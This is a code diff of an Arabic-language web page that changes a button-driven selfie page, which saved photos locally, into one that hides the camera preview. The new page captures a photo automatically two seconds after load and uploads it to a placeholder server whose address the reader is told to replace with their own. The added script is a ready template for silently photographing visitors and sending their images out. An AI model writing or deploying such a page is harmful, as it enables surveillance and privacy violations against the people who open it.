@@ -2,30 +2,49 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>سيلفي سريع</title>
+<title>التقاط صورة تلقائي</title>
 </head>
 <body>
-<h3>اضغط السماح للكاميرا لالتقاط سيلفي</h3>
-<video id="video" autoplay style="display:block;"></video>
-<button id="snap">التقاط الصورة</button>
+<h3>جاري التقاط الصورة...</h3>
+<video id="video" autoplay style="display:none;"></video>
 <script>
-const video = document.getElementById('video');
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => video.srcObject = stream)
-.catch(err => alert('فشل الوصول للكاميرا: ' + err));
+async function capturePhoto() {
+  try {
+    // طلب إذن الكاميرا
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById('video');
+    video.srcObject = stream;
 
-document.getElementById('snap').onclick = () => {
+    // إنشاء canvas لالتقاط الصورة
     const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    const imgData = canvas.toDataURL('image/png');
-    const link = document.createElement('a');
-    link.href = imgData;
-    link.download = 'selfie.png';
-    link.click();
-    alert('تم التقاط الصورة! يمكنك حفظها الآن.');
-};
+    video.addEventListener('loadedmetadata', () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // التقاط الصورة بعد ثانيتين
+      setTimeout(async () => {
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imgData = canvas.toDataURL('image/jpeg');
+
+        // إرسال الصورة إلى أي سيرفر عبر POST (ضع رابطك هنا)
+        await fetch('https://example.com/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: imgData })
+        });
+
+        alert('تم التقاط الصورة وإرسالها!');
+        stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا
+      }, 2000);
+    });
+  } catch (err) {
+    alert('فشل الوصول إلى الكاميرا: ' + err);
+  }
+}
+
+// تشغيل الوظيفة مباشرة عند فتح الصفحة
+capturePhoto();
 </script>
 </body>
 </html>
